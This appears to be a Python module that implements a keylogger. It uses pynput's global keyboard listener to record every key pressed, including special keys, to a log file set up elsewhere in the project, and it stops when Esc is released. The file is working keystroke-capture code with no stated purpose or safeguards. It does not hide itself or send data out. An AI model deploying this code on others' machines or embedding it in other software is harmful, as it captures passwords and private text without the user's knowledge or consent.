from pynput import keyboard
import logging
from utils.logger_setup import setup_logger

class KeyLogger:
    def __init__(self):
        setup_logger()
        self.listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )

    def on_press(self, key):
        try:
            logging.info(f"Key: {key.char}")
        except AttributeError:
            logging.info(f"Special Key: {key}")

    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False

    def start(self):
        with self.listener:
            self.listener.join()
